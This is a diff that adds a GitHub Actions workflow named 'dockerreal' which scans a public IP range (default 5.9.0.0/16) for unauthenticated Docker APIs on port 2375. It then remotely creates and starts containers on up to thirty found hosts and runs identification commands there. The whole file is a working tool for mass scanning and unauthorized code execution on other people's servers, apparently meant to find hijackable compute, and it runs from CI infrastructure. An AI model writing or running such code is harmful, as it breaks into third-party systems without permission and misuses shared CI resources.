@@ -1,0 +1,92 @@
+name: dockerreal
+
+on:
+  workflow_dispatch:
+    inputs:
+      cidr:
+        description: CIDR
+        required: true
+        default: 5.9.0.0/16
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: scan
+        env:
+          CIDR: ${{ inputs.cidr }}
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import asyncio
+          import concurrent.futures
+          import ipaddress
+          import os
+          import secrets
+          import time
+
+          import requests
+
+          CIDR = os.environ["CIDR"]
+          ips = [str(ip) for ip in ipaddress.ip_network(CIDR).hosts()]
+
+          async def probe(ip):
+              try:
+                  reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 2375), 1.5)
+                  writer.close()
+                  return ip
+              except Exception:
+                  return None
+
+          async def run():
+              sem = asyncio.Semaphore(1200)
+              async def guarded(ip):
+                  async with sem:
+                      return await probe(ip)
+              return [ip for ip in await asyncio.gather(*(guarded(ip) for ip in ips)) if ip]
+
+          started = time.time()
+          open_ips = asyncio.run(run())
+          print(f"cidr={CIDR} scanned={len(ips)} open={len(open_ips)} secs={int(time.time()-started)}", flush=True)
+
+          def info(ip):
+              try:
+                  d = requests.get(f"http://{ip}:2375/info", timeout=4).json()
+                  if "NCPU" in d:
+                      return (ip, d.get("NCPU"), round((d.get("MemTotal") or 0) / 1024**3, 1), d.get("Name"))
+              except Exception:
+                  return None
+              return None
+
+          live = []
+          with concurrent.futures.ThreadPoolExecutor(max_workers=64) as pool:
+              for row in pool.map(info, open_ips):
+                  if row:
+                      live.append(row)
+                      print("DOCKER", row, flush=True)
+
+          def verify(row):
+              ip, cores, ram, name = row
+              base = f"http://{ip}:2375"
+              mark = "MARK" + secrets.token_hex(4)
+              try:
+                  body = {"Image": "alpine:latest",
+                          "Cmd": ["/bin/sh", "-c",
+                                  f"echo {mark}; id; nproc; curl -s https://api.ipify.org; echo; uname -a"],
+                          "HostConfig": {}}
+                  created = requests.post(base + "/containers/create", json=body, timeout=8)
+                  cid = created.json().get("Id", "")
+                  if not cid:
+                      return (ip, cores, ram, name, "create-fail")
+                  requests.post(base + f"/containers/{cid}/start", timeout=8)
+                  time.sleep(3)
+                  logs = requests.get(base + f"/containers/{cid}/logs?stdout=1&stderr=1", timeout=6).text
+                  return (ip, cores, ram, name, logs[:300].replace("\n", " | "))
+              except Exception as exc:
+                  return (ip, cores, ram, name, type(exc).__name__)
+
+          for row in live[:30]:
+              print("RESULT", verify(row), flush=True)
+          PY
